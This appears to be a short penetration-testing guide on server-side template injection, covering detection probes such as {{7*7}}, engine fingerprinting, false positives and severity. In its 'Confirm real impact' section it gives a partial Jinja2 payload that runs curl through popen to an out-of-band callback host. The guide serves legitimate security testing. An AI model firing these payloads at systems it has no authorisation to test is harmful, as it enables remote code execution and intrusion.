# Server-Side Template Injection (SSTI)

User input is embedded into a server-side template that is then evaluated,
letting an attacker execute template expressions and often reach RCE.

## Detect
- `run_scanner ssti` fires engine-specific probes.
- Manually: submit a math probe that only a template engine would evaluate —
  `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`. A response containing `49`
  (not the literal `7*7`) indicates evaluation.
- Fingerprint the engine (Jinja2, Twig, Freemarker, Velocity, ERB) from which
  probe evaluates, then use engine-specific payloads.

## Confirm real impact
- The evaluated arithmetic (`49`) must appear where your input was placed —
  reflection of the *result*, not the literal expression.
- Escalate within the engine to prove code execution: read a config value, or
  run a command and exfiltrate via `oob_register`/`oob_poll` (e.g. Jinja2
  `{{ ...popen('curl <oob>')... }}`). An OOB callback = confirmed RCE.

## False positives to reject
- The literal `{{7*7}}` reflected unchanged — that's plain reflection (check
  for XSS instead), not template evaluation.
- `49` appearing for reasons unrelated to your input (pre-existing content).
- Client-side template frameworks (Angular/Vue) evaluating in the browser —
  that's client-side, potentially XSS, not server-side RCE.

## Severity
Critical once you demonstrate command execution (OOB callback); High for
confirmed expression evaluation without a shown code-exec path.
